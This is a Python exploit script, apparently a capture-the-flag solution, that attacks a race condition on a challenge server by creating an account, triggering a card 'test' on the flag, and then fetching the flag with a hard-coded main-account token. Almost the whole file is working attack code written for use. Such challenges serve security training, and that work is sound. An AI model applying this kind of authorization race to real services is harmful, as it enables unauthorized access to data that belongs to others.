import requests
import json
import time

# Note: You may need to install the 'requests' library: pip install requests

# Updated BASE_URL to the one you provided.
BASE_URL = "https://5f9e0fba-64bb-42e3-80d8-9b3b2d28b1ee.chall.nnsc.tf"

def create_account():
    """Creates a new account and returns its token."""
    print("Creating a new account...")
    response = requests.post(f"{BASE_URL}/accounts/@me")
    if response.status_code != 200:
        print(f"Failed to create account. Status code: {response.status_code}")
        return None
    token = response.json().get("token")
    print(f"Account created with token: {token}")
    return token

def test_card(token: str, card_id: str):
    """Tests a card with the given token."""
    print(f"Attempting to test card '{card_id}'...")
    response = requests.post(
        f"{BASE_URL}/cards/{card_id}/test",
        headers={"Token": token}
    )
    if response.status_code != 200:
        print(f"Test failed with status code {response.status_code}: {response.text}")
    else:
        print("Card test initiated successfully.")

def get_flag(token: str):
    """Attempts to retrieve the flag with the given token."""
    print("Attempting to get the flag...")
    response = requests.get(
        f"{BASE_URL}/flag",
        headers={"Token": token}
    )
    if response.status_code == 200:
        print("\nExploit successful! Flag retrieved:")
        print(response.text)
    else:
        print(f"\nFailed to get flag. Status code: {response.status_code}")
        print(f"Response: {response.text}")

def main():
    """Executes the exploit."""
    print("Starting race condition exploit.")

    # Step 1: Use the provided main account token.
    main_token = "ac6f5a8da316c8012ca67e03544bbfa73fe6b2ff33796e26a8d7d8ecd30fb97e"
    print(f"Using provided main account token: {main_token}")

    # Step 2: Create a "test" account. This account will trigger the vulnerability.
    test_token = create_account()
    if not test_token:
        return

    # Step 3: Use the test account to "test" the flag.
    test_card(test_token, "flag")

    # A short pause is not strictly necessary but can help ensure the server has
    # processed the request.
    print("Waiting a moment to ensure the server processed the test request...")
    time.sleep(0.5)

    # Step 4: Use the main account to get the flag.
    get_flag(main_token)

if __name__ == "__main__":
    main()
